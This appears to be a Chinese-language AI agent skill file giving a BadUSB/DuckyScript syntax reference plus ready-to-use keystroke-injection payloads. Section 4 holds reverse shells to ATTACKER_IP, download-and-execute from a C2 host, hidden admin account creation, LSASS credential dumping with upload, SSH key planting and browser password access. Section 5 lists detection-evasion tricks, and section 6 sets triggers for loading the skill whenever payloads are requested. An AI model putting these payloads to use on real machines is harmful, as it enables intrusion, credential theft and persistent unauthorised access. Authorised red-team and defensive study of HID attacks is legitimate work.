---
name: badusb-duckyscript
description: BadUSB / USB Rubber Ducky 键盘宏脚本（DuckyScript 兼容）完整语法参考与 Payload 生成。覆盖基础语法、全按键分类、延时控制、STRING 文本注入、REPEAT 循环、LOCALE 键盘布局切换、KEYCODE 原始键码、LED 灯光控制。适用于物理社工攻击模拟、HID 注入测试、自动化按键操作。触发词：BadUSB、Rubber Ducky、DuckyScript、键盘宏、HID攻击、按键注入、payload脚本、usb rubber ducky、badusb payload、duckyscript语法。
metadata:
  short-description: BadUSB/DuckyScript 键盘宏语法完整参考与 Payload 生成
  tools: none (纯语法知识与 Payload 模板)
  categories: physical-attack,hid-injection,badusb,payload-generation,social-engineering
version: "1.0"
author: CyberStrikeAI
---

# BadUSB / DuckyScript 键盘宏脚本完整语法规范

> USB Rubber Ducky / BadUSB 类 HID 攻击设备标准脚本语法，兼容 Hak5 DuckyScript 1.0 / 3.0 及常见开源 BadUSB 固件。

## 执行模型

```
物理层：设备枚举为 HID 键盘 → 按脚本逐行注入按键事件
时序模型：按键按下(Press) → 延时 → 按键释放(Release) → 指令间延时
```

**核心原则**：
- 空格分隔的同一行按键 = 同时按下、同时释放（组合键）
- 分行按键 = 依次按下释放（顺序按键）
- 纯文本必须用 `STRING` 包裹，否则被解析为物理按键名

---

## 一、基础语法对照

| 指令写法 | 执行逻辑 |
|----------|----------|
| `WINDOWS` | 单独按下 Win 键后松开 |
| `r` | 单独按下 r 键后松开 |
| `WINDOWS r` | Win 与 r **同时按下**、同时释放（打开运行框）|
| `STRING WINDOWS r` | 直接打出文字 `WINDOWS r`（不触发按键） |

---

## 二、全局控制命令

### 2.1 注释

```
REM 这是单行注释，本行不执行任何操作
```

### 2.2 延时控制

| 指令 | 别名 | 参数 | 说明 |
|------|------|------|------|
| `DEFAULTDELAY` | `DEFAULT_DELAY` | 毫秒(ms) | 全局默认指令间延时，每条指令执行后自动等待 |
| `DELAY` | — | 毫秒(ms) | 单次强制延时，仅影响紧跟的下一处 |

```duckyscript
DEFAULTDELAY 200    REM 所有指令间默认等 200ms
DELAY 3000          REM 此处强制等 3 秒（如等待系统对话框弹出）
```

### 2.3 文本注入

```
STRING Hello World!
STRING 任意中文或ASCII文本内容
```

- `STRING` 会自动处理大小写转换、特殊字符（通过 Shift 组合键实现）
- 适用场景：输入命令、URL、Payload 代码、伪造聊天消息

### 2.4 重复执行

```
REPEAT 5    REM 将紧邻上一行命令重复执行 5 次
REPLAY 3    REM 别名，效果相同
```

```duckyscript
DELAY 200
STRING A
REPEAT 10    REM 输出 AAAAAAAAAA
```

### 2.5 键盘布局切换

```
LOCALE US     REM 美式键盘
LOCALE DE     REM 德式键盘
LOCALE FR     REM 法式键盘
LOCALE GB     REM 英式键盘
LOCALE RU     REM 俄式键盘
```

可选区域代码：`DE` `GB` `US` `ES` `FR` `DK` `RU` `BE` `PT` `IT` `SK` `CZ` `SI` `BG` `CA-FR` `CH-DE` `CH-FR` `HU`

> **重要**：错误的 LOCALE 会导致 STRING 输出乱码（按键映射不匹配）。

### 2.6 原始键码输入

```
KEYCODE 修饰键 按键1 [按键2~按键6]
```

- 支持十进制或十六进制（`0x` 前缀）HID 键值
- 最多 6 个非修饰键同时按下

```duckyscript
KEYCODE 0x02 0x04    REM Ctrl+A (修饰键Ctrl=0x01|0x02, 键A=0x04)
```

### 2.7 RGB 灯光控制（仅部分设备支持）

```
LED 255 0 0     REM 红色
LED 0 255 0     REM 绿色
LED 0 0 255     REM 蓝色
LED 40 20 10    REM 自定义暖色
```

取值 0~255，分别对应 R / G / B 通道。

---

## 三、完整按键清单

### 3.1 字母数字

| 类别 | 按键名 |
|------|--------|
| 小写字母 | `a` `b` `c` `d` `e` `f` `g` `h` `i` `j` `k` `l` `m` `n` `o` `p` `q` `r` `s` `t` `u` `v` `w` `x` `y` `z` |
| 大写字母 | `A` `B` `C` `D` `E` `F` `G` `H` `I` `J` `K` `L` `M` `N` `O` `P` `Q` `R` `S` `T` `U` `V` `W` `X` `Y` `Z` |
| 数字 | `0` `1` `2` `3` `4` `5` `6` `7` `8` `9` |
| 功能键 | `F1` `F2` `F3` `F4` `F5` `F6` `F7` `F8` `F9` `F10` `F11` `F12` |

### 3.2 修饰组合键

| 别名 | 全称 | 对应键盘键 |
|------|------|-----------|
| `CTRL` | `CONTROL` | 左 Control |
| `SHIFT` | `SHIFT` | 左 Shift |
| `ALT` | `ALT` | 左 Alt |
| `WINDOWS` | `GUI` | 左 Win / Command(⌘) |

### 3.3 通用功能键

| 按键 | 别名 | 说明 |
|------|------|------|
| `ENTER` | — | 回车 |
| `MENU` | `APP` | 右键菜单键（Application） |
| `DELETE` | — | Delete 键 |
| `HOME` | — | Home |
| `INSERT` | — | Insert |
| `PAGEUP` | — | Page Up |
| `PAGEDOWN` | — | Page Down |
| `UP` | `UPARROW` | 方向上 |
| `DOWN` | `DOWNARROW` | 方向下 |
| `LEFT` | `LEFTARROW` | 方向左 |
| `RIGHT` | `RIGHTARROW` | 方向右 |
| `TAB` | — | Tab |
| `END` | — | End |
| `ESC` | `ESCAPE` | Escape |
| `SPACE` | — | 空格 |
| `PAUSE` | `BREAK` | Pause/Break |
| `CAPSLOCK` | — | 大小写锁定 |
| `NUMLOCK` | — | 数字锁定 |
| `PRINTSCREEN` | — | 打印屏幕 |
| `SCROLLLOCK` | — | 滚动锁定 |

### 3.4 小键盘专属

| 按键 | 说明 |
|------|------|
| `NUM_0` ~ `NUM_9` | 小键盘数字 0-9 |
| `NUM_ASTERIX` | 小键盘 `*` |
| `NUM_ENTER` | 小键盘 Enter |
| `NUM_MINUS` | 小键盘 `-` |
| `NUM_DOT` | 小键盘 `.` |
| `NUM_PLUS` | 小键盘 `+` |

---

## 四、各 OS 实战 Payload 模板

### 4.1 Windows — 下载执行后门

```duckyscript
REM Windows 反向 Shell (PowerShell)
DEFAULTDELAY 100
DELAY 3000
WINDOWS r
DELAY 500
STRING powershell -WindowStyle Hidden -NoP -Ep Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://C2_IP:8080/beacon')"
DELAY 500
ENTER
```

### 4.2 Windows — 添加管理员用户

```duckyscript
REM 隐蔽添加管理员
DEFAULTDELAY 150
DELAY 2000
WINDOWS r
DELAY 300
STRING cmd /c "net user sysadmin P@ssw0rd123! /add && net localgroup administrators sysadmin /add"
ENTER
```

### 4.3 Windows — 凭据窃取 (ProcDump LSASS)

```duckyscript
REM 下载 ProcDump 并 Dump LSASS
DEFAULTDELAY 200
DELAY 2000
WINDOWS r
DELAY 300
STRING powershell -WindowStyle Hidden -c "cd $env:TEMP; iwr http://C2_IP/procdump.exe -OutFile p.exe; ./p.exe -accepteula -ma lsass.exe lsass.dmp 2>$null; iwr -Uri http://C2_IP/upload -Method POST -InFile lsass.dmp"
ENTER
```

### 4.4 macOS — 反向 Shell

```duckyscript
REM macOS Bash Reverse Shell
DEFAULTDELAY 200
DELAY 2000
GUI SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
ENTER
```

### 4.5 macOS — 下载执行 Payload

```duckyscript
REM macOS curl + bash 执行
DEFAULTDELAY 200
DELAY 2000
GUI SPACE
DELAY 400
STRING terminal
DELAY 400
ENTER
DELAY 800
STRING curl -s http://C2_IP/payload.sh | bash
ENTER
```

### 4.6 Linux — 反向 Shell

```duckyscript
REM Linux GNOME/KDE 环境
DEFAULTDELAY 200
DELAY 2000
CTRL ALT T
DELAY 800
STRING bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
ENTER
```

### 4.7 Linux — SSH 公钥植入

```duckyscript
REM 写入攻击者 SSH 公钥
DEFAULTDELAY 150
DELAY 1500
CTRL ALT T
DELAY 600
STRING echo "ssh-rsa AAAAB3NzaC1yc2EAAA... attacker@kali" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
ENTER
```

### 4.8 通用 — 浏览器凭据导出

```duckyscript
REM 打开浏览器密码管理页面 (Chrome)
DEFAULTDELAY 200
DELAY 2000
WINDOWS r
DELAY 300
STRING chrome chrome://settings/passwords
ENTER
DELAY 3000
TAB
TAB
TAB
ENTER
```

---

## 五、高级技巧与注意事项

### 5.1 免杀 / 绕过技巧

| 技巧 | 说明 |
|------|------|
| **分步输入** | 将命令拆分为多段 STRING，中间插入 DELAY，绕过行为检测 |
| **利用 STRING 大小写** | 依赖键盘布局映射，某些 EDR 只监控固定命令字符串 |
| **Base64 编码命令** | PowerShell `-Enc` 参数传递 Base64 编码的命令 |
| **环境变量拼接** | `STRING cmd /c "set a=po&&set b=wer&&%a%%b%shell ..."` |
| **延时混入** | 常态按键间插 DELAY 50~200ms，接近人类打字速度 |

### 5.2 调试与验证

```duckyscript
REM 自验证脚本 — 打开记事本输出测试文字
DEFAULTDELAY 200
DELAY 2000
WINDOWS r
DELAY 300
STRING notepad
ENTER
DELAY 800
STRING [OK] BadUSB Payload Activated - Timestamp:
ENTER
```

### 5.3 HID 键码速查（常用组合）

| 组合 | 键码 | 用途 |
|------|------|------|
| `CTRL C` | `KEYCODE 0x01 0x06` | 复制 |
| `CTRL V` | `KEYCODE 0x01 0x19` | 粘贴 |
| `CTRL A` | `KEYCODE 0x01 0x04` | 全选 |
| `CTRL W` | `KEYCODE 0x01 0x1A` | 关闭标签/窗口 |
| `ALT F4` | `KEYCODE 0x04 0x3D` | 关闭窗口 |
| `ALT TAB` | `KEYCODE 0x04 0x2B` | 切换窗口 |
| `CTRL SHIFT ESC` | `KEYCODE 0x05 0x29` | 任务管理器 |

---

## 六、Skill 使用触发条件

当以下任一场景出现时，应加载本 Skill：

1. 用户要求生成 **BadUSB / Rubber Ducky payload**
2. 渗透测试中需要 **物理社工 HID 注入** 攻击向量
3. 用户询问 **DuckyScript 语法** 或键盘宏脚本编写
4. 红队需要 **快速免杀初始访问** 方案（物理插入途径）
5. 用户要求编写 **自动化按键操作脚本**
